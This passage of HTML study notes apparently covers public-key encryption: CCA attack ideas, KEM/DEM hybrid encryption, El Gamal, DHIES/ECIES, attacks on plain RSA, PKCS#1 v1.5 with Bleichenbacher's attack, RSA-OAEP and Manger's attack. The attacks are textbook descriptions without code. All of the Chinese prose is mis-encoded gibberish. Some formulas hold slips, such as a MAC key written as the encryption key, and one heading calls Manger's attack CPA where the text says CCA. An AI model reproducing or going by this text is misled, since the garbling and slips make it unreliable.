é’ˆå¯¹é€‰æ‹©å¯†æ–‡æ”»å‡»çš„å®‰å…¨æ€§</h3><p><strong>CCAæ”»å‡»æ–¹æ¡ˆï¼š</strong></p><ul><li>ä¿®æ”¹å‘é€è€…å‘é€çš„å¯†æ–‡$c$å˜ä¸º$c_0$ï¼ˆå¦‚ä¿®æ”¹â€æ”¶ä»¶äººâ€ç­‰å›ºå®šçš„åœ°æ–¹ï¼‰ï¼Œç„¶åå†ä»æ¥æ”¶è€…çš„ååº”è¡ŒåŠ¨æ¨æµ‹æ˜æ–‡$m$çš„ä¸€äº›å†…å®¹</li><li>ä¿®æ”¹å¯†æ–‡$c$å˜ä¸º$c_0$ï¼Œå…¶ä¸­æŠŠå‘é€äººæ”¹ä¸ºè‡ªå·±ï¼Œåç»­å¯èƒ½æ”¶åˆ°å›ä¿¡ï¼Œä»è€Œå¾—åˆ°æ˜æ–‡$m_0$çš„ä¸€äº›ä¿¡æ¯ã€‚</li></ul><h2 id="12-3æ··åˆåŠ å¯†å’ŒKEM-DEMèŒƒä¾‹"><a href="#12-3æ··åˆåŠ å¯†å’ŒKEM-DEMèŒƒä¾‹" class="headerlink" title="12.3æ··åˆåŠ å¯†å’ŒKEM&#x2F;DEMèŒƒä¾‹"></a>12.3æ··åˆåŠ å¯†å’ŒKEM&#x2F;DEMèŒƒä¾‹</h2><p><strong>ä¸»è¦æ€æƒ³ï¼š</strong></p><ul><li>å‘é€æ–¹ï¼šä½¿ç”¨$pk$åŠ å¯†ç§é’¥å¯†é’¥$k$å¾—åˆ°$c$ï¼Œä½¿ç”¨$k$åŠ å¯†æ˜æ–‡$m$å¾—åˆ°$c_1$ï¼Œå…¨éƒ¨å‘é€ç»™æ¥æ”¶æ–¹</li><li>æ¥æ”¶æ–¹ï¼šä½¿ç”¨$sk$è§£å¯†$c$çš„åˆ°å¯†é’¥$k$ï¼Œå†ä½¿ç”¨$k$è§£å¯†$c_1$å¾—åˆ°æ˜æ–‡$m$</li></ul><p>å°è£…æ“ä½œï¼Œä¸€æ¬¡æ€§å®Œæˆä¸Šé¢æ“ä½œ<br><strong>KEMï¼ˆKey Encapsulation Mechanismï¼‰ï¼š</strong><br><strong>KEMè´Ÿè´£å®‰å…¨åœ°ä¼ è¾“å¯¹ç§°å¯†é’¥</strong>ï¼Œç¡®ä¿åªæœ‰æ¥æ”¶æ–¹èƒ½å¤Ÿè·å–å¯¹ç§°å¯†é’¥ã€‚</p><ul><li>å‘é€æ–¹ä½¿ç”¨æ¥æ”¶æ–¹çš„å…¬é’¥$pk$å°†å¯¹ç§°å¯†é’¥$k$å°è£…æˆä¸€ä¸ªå¯†æ–‡$c$ã€‚</li><li>æ¥æ”¶æ–¹ä½¿ç”¨è‡ªå·±çš„ç§é’¥$sk$ä»å¯†æ–‡$c$ä¸­è§£å°è£…å‡ºå¯¹ç§°å¯†é’¥$k$ã€‚</li></ul><p><strong>DEMï¼ˆData Encapsulation Mechanismï¼‰ï¼š</strong><br><strong>DEMè´Ÿè´£é«˜æ•ˆåœ°åŠ å¯†å’Œè§£å¯†æ•°æ®</strong>ï¼Œåˆ©ç”¨å¯¹ç§°åŠ å¯†çš„é«˜æ•ˆæ€§ã€‚</p><ul><li>å‘é€æ–¹ä½¿ç”¨å¯¹ç§°å¯†é’¥$k$å¯¹æ˜æ–‡$m$è¿›è¡ŒåŠ å¯†ï¼Œå¾—åˆ°å¯†æ–‡$c1â€‹$ã€‚</li><li>æ¥æ”¶æ–¹ä½¿ç”¨å¯¹ç§°å¯†é’¥$k$å¯¹å¯†æ–‡$c1â€‹$è¿›è¡Œè§£å¯†ï¼Œå¾—åˆ°æ˜æ–‡$m$ã€‚</li></ul><h3 id="12-3-1-CPAå®‰å…¨"><a href="#12-3-1-CPAå®‰å…¨" class="headerlink" title="12.3.1 CPAå®‰å…¨"></a>12.3.1 CPAå®‰å…¨</h3><p>å¦‚æœKEMæ˜¯CPAå®‰å…¨çš„ï¼Œä¸”ç§é’¥åŠ å¯†æ–¹æ¡ˆï¼ˆDEMï¼‰ç¬¦åˆåŸºæœ¬çš„å®‰å…¨æ€§ï¼Œé‚£ä¹ˆæ··åˆåŠ å¯†æ–¹æ¡ˆä¹Ÿæ˜¯CPAå®‰å…¨çš„</p><h3 id="12-3-2-CCAå®‰å…¨"><a href="#12-3-2-CCAå®‰å…¨" class="headerlink" title="12.3.2 CCAå®‰å…¨"></a>12.3.2 CCAå®‰å…¨</h3><p>å¦‚æœKEMæ˜¯CCAå®‰å…¨çš„ï¼Œä¸”ç§é’¥åŠ å¯†æ–¹æ¡ˆï¼ˆDEMï¼‰ä¹Ÿæ˜¯CCAå®‰å…¨çš„ï¼Œé‚£ä¹ˆæ··åˆåŠ å¯†æ–¹æ¡ˆä¹Ÿæ˜¯CCAå®‰å…¨çš„</p><h2 id="12-4-åŸºäºCDH-DDHçš„åŠ å¯†"><a href="#12-4-åŸºäºCDH-DDHçš„åŠ å¯†" class="headerlink" title="12.4 åŸºäºCDH&#x2F;DDHçš„åŠ å¯†"></a>12.4 åŸºäºCDH&#x2F;DDHçš„åŠ å¯†</h2><h3 id="12-4-1-El-GamalåŠ å¯†"><a href="#12-4-1-El-GamalåŠ å¯†" class="headerlink" title="12.4.1 El GamalåŠ å¯†"></a>12.4.1 El GamalåŠ å¯†</h3><p><strong>å¯†é’¥ç”Ÿæˆï¼š</strong></p><ul><li>Aliceä½¿ç”¨ç”Ÿæˆå…ƒ$g$å¾—åˆ°ä¸€ä¸ªé˜¶ä¸º$q$çš„å¾ªç¯ç¾¤$G$</li><li>éšæœºå‡åŒ€é€‰æ‹©ä¸€ä¸ª$x\in [1,q-1]$è®¡ç®—$h:&#x3D;g^x$</li><li>å…¬å¼€å…¬é’¥$(G,q,g,h)$ï¼Œä¿ç•™$x$ä½œä¸ºç§é’¥<br><strong>åŠ å¯†ç®—æ³•ï¼š</strong></li><li>Bobéšæœºå‡åŒ€é€‰æ‹©$y\in [1,q-1]$ï¼Œè®¡ç®—å¯†æ–‡$c_1:&#x3D;g^y$</li><li>è®¡ç®—å…±äº«ç§˜å¯†$s:&#x3D;h^y$</li><li>è®¡ç®—$c_2:&#x3D;ms$</li><li>å°†å¯†æ–‡$(c_1,c_2)&#x3D;(g^y,mh^y)&#x3D;(g^y,m(g^x)^y)$<blockquote><p>å¦‚æœä¸€ä¸ªäººçŸ¥é“äº†mï¼Œé‚£ä¹ˆå®ƒå¾ˆå®¹æ˜“å°±èƒ½çŸ¥é“$h^y$çš„å€¼ã€‚å› æ­¤å¯¹æ¯ä¸€æ¡ä¿¡æ¯éƒ½äº§ç”Ÿä¸€ä¸ªæ–°çš„$y$å¯ä»¥æé«˜å®‰å…¨æ€§ã€‚æ‰€ä»¥$y$ä¹Ÿè¢«ç§°ä½œ<strong>ä¸´æ—¶å¯†é’¥</strong></p></blockquote></li></ul><p><strong>è§£å¯†ç®—æ³•ï¼š</strong></p><ul><li>Aliceè®¡ç®—å…±äº«ç§˜å¯†$s:&#x3D;c_1^x$</li><li>è®¡ç®—$m&#x3D;c_2s^{-1}$</li></ul><h3 id="å®æ–½é—®é¢˜"><a href="#å®æ–½é—®é¢˜" class="headerlink" title="å®æ–½é—®é¢˜"></a>å®æ–½é—®é¢˜</h3><ul><li>å…±äº«å…¬é’¥å‚æ•°</li><li>ç»„åˆ«é€‰æ‹©</li><li>æ¶ˆæ¯ç©ºé—´</li></ul><p><strong>åŸºäºEl Gamalçš„KEMæ„é€ </strong><br><strong>Genï¼ˆå¯†é’¥ç”Ÿæˆï¼‰</strong>ï¼š</p><ul><li>è¾“å…¥å®‰å…¨å‚æ•°$1^n$ï¼Œè¿è¡Œç¾¤ç”Ÿæˆç®—æ³•$G(1^n)$ï¼Œå¾—åˆ°ç¾¤$Gã€é˜¶qå’Œç”Ÿæˆå…ƒg$ã€‚</li><li>éšæœºé€‰æ‹©ä¸€ä¸ªç§é’¥$xâˆˆZ_q$â€‹ï¼Œè®¡ç®—å…¬é’¥$h&#x3D;g^x$ã€‚     </li><li>å®šä¹‰ä¸€ä¸ªå‡½æ•°$H:Gâ†’{0,1}^â„“$ï¼Œå…¶ä¸­$â„“$æ˜¯æŸä¸ªå‡½æ•°çš„å€¼ã€‚</li><li>å…¬é’¥ä¸º$(G,q,g,h,H)$ï¼Œç§é’¥ä¸º$(G,q,g,x)$ã€‚</li></ul><p><strong>Encapsï¼ˆå°è£…ï¼‰</strong>ï¼š   </p><ul><li>è¾“å…¥å…¬é’¥$pk&#x3D;(G,q,g,h,H)$ã€‚     </li><li>éšæœºé€‰æ‹©$yâˆˆZq_â€‹$ï¼Œè®¡ç®—å¯†æ–‡$c&#x3D;g^y$ã€‚    </li><li>è®¡ç®—å¯¹ç§°å¯†é’¥$K&#x3D;H(h^y)$ã€‚</li><li>è¾“å‡ºå¯†æ–‡$c$å’Œå¯¹ç§°å¯†é’¥$K$ã€‚</li></ul><p><strong>Decapsï¼ˆè§£å°è£…ï¼‰</strong>ï¼š</p><ul><li>è¾“å…¥ç§é’¥$sk&#x3D;(G,q,g,x)$å’Œå¯†æ–‡$câˆˆG$ã€‚</li><li>è®¡ç®—$cx&#x3D;(g^y)^x&#x3D;g^{xy}$ã€‚</li><li>è®¡ç®—å¯¹ç§°å¯†é’¥$K&#x3D;H(g^{xy})$ã€‚</li><li>è¾“å‡ºå¯¹ç§°å¯†é’¥$K$ã€‚</li></ul><blockquote><p>psï¼šå…¶ä¸­$H$åº”ä¸ºä¸€ç§ç†æƒ³åŒ–çš„Hashå‡½æ•°</p></blockquote><blockquote><p>CDHæ˜¯ä¸€ä¸ª<strong>è®¡ç®—é—®é¢˜</strong>ï¼Œè¦æ±‚è®¡ç®—å‡ºå…·ä½“çš„å…±äº«å¯†é’¥$g^{ab}$ã€‚<br>DDHæ˜¯ä¸€ä¸ª<strong>å†³ç­–é—®é¢˜</strong>ï¼Œè¦æ±‚åˆ¤æ–­ä¸€ä¸ªç»™å®šçš„ç¾¤å…ƒç´ æ˜¯å¦æ˜¯ä¸¤ä¸ªå…¶ä»–ç¾¤å…ƒç´ çš„â€œç»„åˆâ€</p></blockquote><h3 id="12-4-2-åŸºäºDDHçš„å¯†é’¥å°è£…"><a href="#12-4-2-åŸºäºDDHçš„å¯†é’¥å°è£…" class="headerlink" title="12.4.2 åŸºäºDDHçš„å¯†é’¥å°è£…"></a>12.4.2 åŸºäºDDHçš„å¯†é’¥å°è£…</h3><p><strong>å®šç†ï¼š</strong> å¦‚æœDDHï¼ˆå†³ç­–æ€§Diffie-Hellmanï¼‰é—®é¢˜åœ¨ç¾¤Gä¸­æ˜¯å›°éš¾çš„ï¼Œå¹¶ä¸”HæŒ‰ç…§ä¸Šè¾¹æ–¹å¼é€‰æ‹©ï¼Œé‚£ä¹ˆè¿™ç§æ„é€ æ˜¯ä¸€ä¸ªCPAå®‰å…¨çš„KEM</p><h3 id="12-4-3-åŸºäºCDHçš„éšæœºé¢„è¨€æ¨¡å‹ä¸­çš„KEM"><a href="#12-4-3-åŸºäºCDHçš„éšæœºé¢„è¨€æ¨¡å‹ä¸­çš„KEM" class="headerlink" title="12.4.3 åŸºäºCDHçš„éšæœºé¢„è¨€æ¨¡å‹ä¸­çš„KEM"></a>12.4.3 åŸºäºCDHçš„éšæœºé¢„è¨€æ¨¡å‹ä¸­çš„KEM</h3><p><strong>CDHå‡è®¾</strong>ï¼šCDHå‡è®¾è¡¨æ˜ï¼Œç»™å®š$g^x$å’Œ$g^y$ï¼Œè®¡ç®—$g^{xy}$æ˜¯å›°éš¾çš„ã€‚<br><strong>å®šç†ï¼š</strong> å¦‚æœCDHé—®é¢˜æ˜¯å›°éš¾çš„ï¼Œå¹¶ä¸” H è¢«å»ºæ¨¡ä¸ºéšæœºé¢„è¨€ï¼Œé‚£ä¹ˆConstruction 12.19æ˜¯CPAå®‰å…¨çš„</p><h3 id="12-4-4-é€‰æ‹©å¯†æ–‡å®‰å…¨æ€§å’ŒDHIES-ECIES"><a href="#12-4-4-é€‰æ‹©å¯†æ–‡å®‰å…¨æ€§å’ŒDHIES-ECIES" class="headerlink" title="12.4.4 é€‰æ‹©å¯†æ–‡å®‰å…¨æ€§å’ŒDHIES&#x2F;ECIES"></a>12.4.4 é€‰æ‹©å¯†æ–‡å®‰å…¨æ€§å’ŒDHIES&#x2F;ECIES</h3><p><strong>å®šç†ï¼š</strong> å¦‚æœå‡è®¾$gap-CDH$é—®é¢˜æ˜¯å›°éš¾çš„ï¼Œé‚£ä¹ˆKEMå¯ä»¥å®ç°CCAå®‰å…¨<br><strong>gap-CDHå‡è®¾ï¼š</strong><br>Gap-CDHå‡è®¾æ˜¯CDHé—®é¢˜çš„ä¸€ä¸ªæ›´å¼ºç‰ˆæœ¬ï¼Œå®ƒå‡è®¾å³ä½¿æ”»å‡»è€…å¯ä»¥è®¿é—®ä¸€ä¸ªè§£å†³DDHé—®é¢˜çš„é¢„è¨€æœºï¼ŒCDHé—®é¢˜ä»ç„¶æ˜¯å›°éš¾çš„ã€‚æ¢å¥è¯è¯´ï¼Œå³ä½¿æ”»å‡»è€…å¯ä»¥åˆ¤æ–­$g^x$å’Œ$g^y$æ˜¯å¦ä¸$g^{xy}$æœ‰å…³ï¼Œä»–ä»¬ä»ç„¶æ— æ³•è®¡ç®—$g^{xy}$ã€‚</p><p><strong>DHIES&#x2F;ECIESæ–¹æ¡ˆï¼š</strong><br>è¿™æ˜¯ä¸€ä¸ªCCAå®‰å…¨çš„åŠ å¯†æ–¹æ¡ˆï¼Œç»“åˆKEMå’Œç§é’¥åŠ å¯†æ–¹æ¡ˆï¼ˆå¦‚CPAå®‰å…¨çš„å¯¹ç§°åŠ å¯†æ–¹æ¡ˆï¼‰ä»¥åŠMACã€‚<br><strong>Genï¼š</strong></p><ul><li>è¾“å…¥å®‰å…¨å‚æ•°$1^n$ï¼Œå…è®¸ç¾¤ç”Ÿæˆç®—æ³•$G(1^n)$ï¼Œå¾—åˆ°ç¾¤$G$ã€é˜¶$q$å’Œç”Ÿæˆå…ƒ$g$</li><li>éšæœºé€‰æ‹©$x\in Z_q$ï¼Œè®¡ç®—$h&#x3D;g^x$</li><li>å®šä¹‰ä¸€ä¸ªå‡½æ•°$Hï¼šG\to {0,1}^{2n}$</li><li>å…¬é’¥${G,q,g,h,H}$ï¼Œç§é’¥ä¸º$x$</li></ul><p><strong>Encï¼š</strong></p><ul><li>è¾“å…¥å…¬é’¥$pk&#x3D;(G,q,g,h,H)$å’Œæ¶ˆæ¯$m$</li><li>éšæœºé€‰æ‹©$y\in Z_q$ï¼Œè®¡ç®—$k_E||k_M&#x3D;H(h^y)$ï¼Œå…¶ä¸­$k_E$æ˜¯å¯¹ç§°åŠ å¯†å¯†é’¥ï¼Œ$k_M$æ˜¯MACå¯†é’¥</li><li>ä½¿ç”¨å¯¹ç§°åŠ å¯†æ–¹æ¡ˆ$\Pi <em>E$åŠ å¯†æ¶ˆæ¯$m$ï¼Œå¾—åˆ°$c_0&#x3D;Enc</em>{k_E}(m)$</li><li>è®¡ç®—MACå€¼$t&#x3D;Mac_{k_M}(c_0)$</li><li>è¾“å‡ºå¯†æ–‡$(g^y,c_0,t)$</li></ul><p><strong>Decï¼š</strong></p><ul><li>è¾“å…¥ç§é’¥$sk&#x3D;(G,q,g,x,H)$å’Œå¯†æ–‡$(c,c_0,t)$</li><li>æ£€æŸ¥$c\in G$ï¼Œå¦‚æœ$c\notin G$ï¼Œè¿”å›$\perp$</li><li>è®¡ç®—$k_E||k_E&#x3D;H(c^x)$</li><li>éªŒè¯MACå€¼$Vefy_{k_E}(c_0,t)$ã€‚å¾—åˆ°æ¶ˆæ¯$m&#x3D;Dec_{k_E}(c_0)$</li></ul><p><strong>DHIES&#x2F;ECIES:</strong></p><ul><li><strong>DHIES</strong>ï¼šå½“ç¾¤$G$æ˜¯æœ‰é™åŸŸçš„å¾ªç¯å­ç¾¤æ—¶ï¼Œè¿™ç§æ„é€ è¢«ç§°ä¸ºDHIESã€‚</li><li><strong>ECIES</strong>ï¼šå½“ç¾¤$G$æ˜¯æ¤­åœ†æ›²çº¿ç¾¤æ—¶ï¼Œè¿™ç§æ„é€ è¢«ç§°ä¸ºECIESã€‚</li></ul><h2 id="12-5åŸºäºRSAçš„åŠ å¯†"><a href="#12-5åŸºäºRSAçš„åŠ å¯†" class="headerlink" title="12.5åŸºäºRSAçš„åŠ å¯†"></a>12.5åŸºäºRSAçš„åŠ å¯†</h2><h3 id="12-5-1-æ™®é€šRSAåŠ å¯†"><a href="#12-5-1-æ™®é€šRSAåŠ å¯†" class="headerlink" title="12.5.1 æ™®é€šRSAåŠ å¯†"></a>12.5.1 æ™®é€šRSAåŠ å¯†</h3><h4 id="æ™®é€šRSAä¸­çš„æ›´å¤šæ”»å‡»"><a href="#æ™®é€šRSAä¸­çš„æ›´å¤šæ”»å‡»" class="headerlink" title="æ™®é€šRSAä¸­çš„æ›´å¤šæ”»å‡»"></a>æ™®é€šRSAä¸­çš„æ›´å¤šæ”»å‡»</h4><ul><li>mæ¢å¤æ•ˆç‡æå‡ä¸¤å€<br><strong>æ˜æ–‡åˆ†è§£</strong>ï¼šå‡è®¾$m$æ˜¯ä¸€ä¸ªå‡åŒ€çš„$n$ä½æ•´æ•°ï¼Œé‚£ä¹ˆå¯¹äºé€‚å½“çš„$Î±â‰ˆ\frac 12$â€‹ï¼Œå¯ä»¥è¯æ˜ä»¥é«˜æ¦‚ç‡å­˜åœ¨æ•´æ•°$r$å’Œ$s$ï¼Œä½¿å¾—$1&lt;râ‰¤sâ‰¤2^{Î±n}$ä¸”$m&#x3D;rs$</li></ul><p><strong>æ”»å‡»è¿‡ç¨‹</strong>ï¼š<br>1.è®¡ç®—$x_râ€‹&#x3D;cr^{âˆ’e} \mod N$ï¼Œè¿™å®é™…ä¸Šæ˜¯å°†å¯†æ–‡$c$é™¤ä»¥$r^e$ã€‚<br>2.å¦‚æœå­˜åœ¨æŸä¸ª$s$ä½¿å¾—$s^e\mod N&#x3D;x_r$â€‹ï¼Œåˆ™$m&#x3D;râ‹…s$ã€‚<br>3.é€šè¿‡æ’åºå’ŒäºŒåˆ†æŸ¥æ‰¾ï¼Œå¯ä»¥åœ¨$O(T)$çš„æ—¶é—´å†…æ‰¾åˆ°è¿™æ ·çš„$r$å’Œ$s$</p><ul><li>å°eåŠ å¯†</li><li>méƒ¨åˆ†å·²çŸ¥</li><li>åŠ å¯†ç›¸å…³æ¶ˆæ¯</li><li>å‘å¤šä¸ªæ¥æ”¶è€…å‘é€ç›¸åŒæ¶ˆæ¯</li></ul><blockquote><p>è¿™éƒ¨åˆ†å†…å®¹å¯ä»¥çœ‹æˆ‘åšå®¢CTF RSAé¢˜å‹</p></blockquote><h3 id="12-5-2-Padded-RSA-å’Œ-PKCS-1-v1-5"><a href="#12-5-2-Padded-RSA-å’Œ-PKCS-1-v1-5" class="headerlink" title="12.5.2 Padded RSA å’Œ PKCS#1 v1.5"></a>12.5.2 Padded RSA å’Œ PKCS#1 v1.5</h3><p><strong>éšæœºå¡«å……çš„ä½œç”¨</strong>ï¼šéšæœºå¡«å……$r$ä½¿å¾—åŠ å¯†è¿‡ç¨‹ä¸å†æ˜¯ç¡®å®šæ€§çš„ï¼Œä»è€Œæé«˜äº†å®‰å…¨æ€§</p><h4 id="RSA-PKCS-1-v1-5"><a href="#RSA-PKCS-1-v1-5" class="headerlink" title="RSA  PKCS#1 v1.5"></a>RSA  PKCS#1 v1.5</h4><p><strong>æ¶ˆæ¯é•¿åº¦ï¼š</strong> æ¶ˆæ¯$m$çš„é•¿åº¦ä¸º$D$å­—èŠ‚ï¼Œå…¶ä¸­$1\leq D\leq k-11$ï¼Œ$k$æ˜¯$N$çš„å­—èŠ‚é•¿åº¦<br><strong>åŠ å¯†è¿‡ç¨‹ï¼š</strong></p><ul><li>é€‰æ‹©ä¸€ä¸ªé•¿ä¸º$k-D-3$å­—èŠ‚çš„éšæœºå¡«å……$r$ï¼Œä¸”$r$ä¸­æ²¡æœ‰å­—èŠ‚ç­‰äº0x00</li><li>å¡«å……åçš„æ¶ˆæ¯$p&#x3D;0x00||0x02||r||0x00||m$</li><li>è®¡ç®—å¯†æ–‡$c&#x3D;p^e\mod N$</li></ul><p><strong>ç¼ºé™·ï¼š</strong><br>å¡«å……é•¿åº¦å¯èƒ½å¤ªçŸ­ï¼Œæ”»å‡»è€…å¯é€šè¿‡æš´åŠ›æ”»å‡»æ¢å¤éƒ¨åˆ†æ˜æ–‡</p><h3 id="12-5-3-æ— éšæœºé¢„è¨€çš„CPAå®‰å…¨åŠ å¯†"><a href="#12-5-3-æ— éšæœºé¢„è¨€çš„CPAå®‰å…¨åŠ å¯†" class="headerlink" title="12.5.3 æ— éšæœºé¢„è¨€çš„CPAå®‰å…¨åŠ å¯†"></a>12.5.3 æ— éšæœºé¢„è¨€çš„CPAå®‰å…¨åŠ å¯†</h3><blockquote><p>æœ¬å°èŠ‚åªè¿›è¡Œç†è®ºä¸Šçš„è®¨è®ºï¼Œå› ä¸ºå®é™…ä¸­æœ‰æ›´é«˜æ•ˆçš„æ„é€ æ–¹æ¡ˆ</p></blockquote><h4 id="RSAé—®é¢˜çš„ç¡¬æ ¸è°“è¯"><a href="#RSAé—®é¢˜çš„ç¡¬æ ¸è°“è¯" class="headerlink" title="RSAé—®é¢˜çš„ç¡¬æ ¸è°“è¯"></a>RSAé—®é¢˜çš„ç¡¬æ ¸è°“è¯</h4><p><strong>å®šä¹‰</strong>ï¼šç¡¬æ ¸è°“è¯æ˜¯ä¸€ç§ä»å•å‘å‡½æ•°çš„è¾“å‡ºä¸­éš¾ä»¥è®¡ç®—çš„ç‰¹å®šä¿¡æ¯ã€‚å¯¹äºRSAé—®é¢˜ï¼Œæœ€å°æœ‰æ•ˆä½ï¼ˆlsbï¼‰è¢«è¯æ˜æ˜¯ä¸€ä¸ªç¡¬æ ¸è°“è¯ã€‚</p><h4 id="æ„å»ºKEM"><a href="#æ„å»ºKEM" class="headerlink" title="æ„å»ºKEM"></a>æ„å»ºKEM</h4><p><strong>ç›®æ ‡</strong>ï¼šæ‰©å±•å•æ¯”ç‰¹åŠ å¯†æ–¹æ¡ˆï¼Œç”Ÿæˆä¸€ä¸ªé•¿åº¦ä¸º$n$çš„å¯†é’¥ã€‚<br><strong>æ–¹æ³•</strong>ï¼šé€šè¿‡é‡å¤åº”ç”¨RSAç½®æ¢ï¼ˆå³æ¨¡$N$ä¸‹çš„$e$æ¬¡å¹‚è¿ç®—ï¼‰ï¼Œä»ä¸€ä¸ªåˆå§‹éšæœºå€¼$c_1â€‹$å¼€å§‹ï¼Œä¾æ¬¡è®¡ç®—$c_1^e \mod N$ï¼Œ$(c_1^eâ€‹)^e\mod N$ï¼Œç›´åˆ°$c_1^{e^n} \mod N$ã€‚æœ€ç»ˆçš„å¯†æ–‡æ˜¯$c_{n+1}$â€‹ï¼Œè€Œå¯†é’¥åˆ™æ˜¯ç”±è¿™äº›ä¸­é—´å€¼çš„æœ€å°æœ‰æ•ˆä½ç»„æˆçš„åºåˆ—ã€‚<br><strong>è§£å¯†è¿‡ç¨‹</strong>ï¼šæ¥æ”¶æ–¹ä½¿ç”¨ç§é’¥$d_0â€‹&#x3D;[d^n\mod Ï•(N)]$åå‘è®¡ç®—ï¼Œæ¢å¤åˆå§‹å€¼$c_1$â€‹ï¼Œå¹¶ä»ä¸­æå–å¯†é’¥ã€‚<br><strong>å®šç†12.35</strong>ï¼šå¦‚æœRSAé—®é¢˜æ˜¯å›°éš¾çš„ï¼Œé‚£ä¹ˆè¯¥æ„å»ºæ˜¯ä¸€ä¸ªCPAå®‰å…¨çš„KEM</p><h4 id="æ•ˆç‡"><a href="#æ•ˆç‡" class="headerlink" title="æ•ˆç‡"></a>æ•ˆç‡</h4><p><strong>åŠ å¯†</strong>ï¼šéœ€è¦$2n$æ¬¡æ¨¡$N$çš„ä¹˜æ³•ã€‚<br><strong>è§£å¯†</strong>ï¼šéœ€è¦ä¸€æ¬¡å®Œæ•´çš„æ¨¡$N$æŒ‡æ•°è¿ç®—ï¼ˆå¤§çº¦3072æ¬¡æ¨¡$N$çš„ä¹˜æ³•ï¼‰åŠ ä¸Šé¢å¤–çš„$2n$æ¬¡æ¨¡$N$çš„ä¹˜æ³•ã€‚</p><h3 id="12-5-4-OAEP-and-PKCS-1-v2"><a href="#12-5-4-OAEP-and-PKCS-1-v2" class="headerlink" title="12.5.4 OAEP and PKCS #1 v2"></a>12.5.4 OAEP and PKCS #1 v2</h3><h4 id="æ™®é€šRSAåŠ å¯†"><a href="#æ™®é€šRSAåŠ å¯†" class="headerlink" title="æ™®é€šRSAåŠ å¯†"></a>æ™®é€šRSAåŠ å¯†</h4><p>çº¯RSAåŠ å¯†è¿CPAå®‰å…¨éƒ½æ— æ³•ä¿è¯ï¼Œå› ä¸ºå®ƒæ˜¯ä¸€ä¸ªç¡®å®šæ€§åŠ å¯†æ–¹æ¡ˆã€‚</p><h4 id="RSA-PKCS-1-v1-5-1"><a href="#RSA-PKCS-1-v1-5-1" class="headerlink" title="RSA PKCS #1 v1.5"></a>RSA PKCS #1 v1.5</h4><p>PKCS #1 v1.5å­˜åœ¨ä¸€ç§æ›´å®ç”¨çš„CCAæ”»å‡»ï¼Œæ”»å‡»è€…ä¸éœ€è¦å®Œæ•´çš„è§£å¯†é¢„è¨€æœºï¼Œåªéœ€è¦ä¸€ä¸ªâ€œéƒ¨åˆ†â€è§£å¯†é¢„è¨€æœºï¼Œè¯¥é¢„è¨€æœºæŒ‡ç¤ºè§£å¯†æ˜¯å¦æˆåŠŸã€‚è¿™ç§æ”»å‡»åˆ©ç”¨äº†PKCS #1 v1.5åœ¨è§£å¯†æ—¶å¯¹å¡«å……æ ¼å¼çš„æ£€æŸ¥ã€‚</p><p>Bleichenbacheræ”»å‡»ï¼šæ”»å‡»è€…é€šè¿‡é€‰æ‹©éšæœºçš„$sâˆˆZ_N^âˆ—â€‹$å¹¶æäº¤$câ€²&#x3D;[s^eâ‹…c\mod N]$ç»™è§£å¯†è€…ï¼Œåˆ©ç”¨è§£å¯†è€…çš„å“åº”æ¥é€æ­¥æ¢å¤æ˜æ–‡$m$ã€‚</p><h4 id="RSA-OAEPæ„å»º"><a href="#RSA-OAEPæ„å»º" class="headerlink" title="RSA-OAEPæ„å»º"></a>RSA-OAEPæ„å»º</h4><p><strong>Genï¼š</strong></p><ul><li>è¾“å…¥å®‰å…¨å‚æ•°$1^n$ï¼Œå…è®¸$Gen(1^n)$ï¼Œå¾—åˆ°å…¬é’¥$(N,e)$å’Œç§é’¥$(N,d)$</li><li>è¾“å‡ºå…¬é’¥$pk&#x3D;(N,e)$å’Œç§é’¥$sk&#x3D;(N,d)$</li></ul><p><strong>Encï¼š</strong></p><ul><li>è¾“å…¥å…¬é’¥$pk&#x3D;(N,e)$å’Œæ¶ˆæ¯$m\in {0,1}^l$</li><li>è®¾ç½®$m_0:&#x3D;m||0^k$ï¼ˆå³åœ¨$m$ååŠ $k$ä¸ª0ï¼‰</li><li>éšæœºé€‰æ‹©$r\in {0,1}^k$</li><li>è®¡ç®—$t:&#x3D;m_0 \oplus G(r)$å’Œ$s:&#x3D;r\oplus H(t)$</li><li>è®¾ç½®$m_1:&#x3D;s||t$</li><li>è¾“å‡ºå¯†æ–‡$c:&#x3D;[m_1^e \mod N]$</li></ul><p><strong>Decï¼š</strong></p><ul><li>è¾“å…¥ç§é’¥$sk&#x3D;(N,d)$å’Œå¯†æ–‡$c\in Z_N^*$</li><li>è®¡ç®—$m_1:&#x3D;[c^d \mod N]$</li><li>è§£æ$m_1$ä¸º$s||t$</li><li>è®¡ç®—$r:&#x3D;H(t)\oplus s$å’Œ$m_0:&#x3D;G(r)\oplus t$</li><li>æ£€æŸ¥$m_0$çš„æœ€å$k$ä½æ˜¯å¦å…¨ä¸º0ï¼Œå¦‚æœä¸æ˜¯ï¼Œè¿”å›é”™è¯¯</li><li>å¦åˆ™ä¸¢å¼ƒ$m_0$çš„æœ€å$k$ä¸ª0ï¼Œè¾“å‡ºå‰©ä½™çš„$l$ä½ä½œä¸ºæ¶ˆæ¯$m$</li></ul><h4 id="Mangerâ€™s-CPA-on-PKCS-1-v2-0"><a href="#Mangerâ€™s-CPA-on-PKCS-1-v2-0" class="headerlink" title="Mangerâ€™s CPA on PKCS #1 v2.0."></a>Mangerâ€™s CPA on PKCS #1 v2.0.</h4><p><strong>Mangeræ”»å‡»</strong>ï¼š2001å¹´ï¼ŒJames Mangerå‘ç°äº†ä¸€ç§é’ˆå¯¹PKCS #1 v2.0çš„CCAæ”»å‡»ï¼Œå³ä½¿PKCS #1 v2.0æ˜¯RSA-OAEPçš„ä¸€ä¸ªå˜ä½“ã€‚è¿™ç§æ”»å‡»åˆ©ç”¨äº†æŸäº›å®ç°ä¸­è¿”å›ä¸åŒé”™è¯¯ä¿¡æ¯çš„é—®é¢˜ã€‚</p><h3 id="12-5-5-éšæœºé¢„è¨€æ¨¡å‹ä¸­CCAå®‰å…¨çš„KEM"><a href="#12-5-5-éšæœºé¢„è¨€æ¨¡å‹ä¸­CCAå®‰å…¨çš„KEM" class="headerlink" title="12.5.5 éšæœºé¢„è¨€æ¨¡å‹ä¸­CCAå®‰å…¨çš„KEM"></a>12.5.5 éšæœºé¢„è¨€æ¨¡å‹ä¸­CCAå®‰å…¨çš„KEM</h3><p><strong>æ„é€ 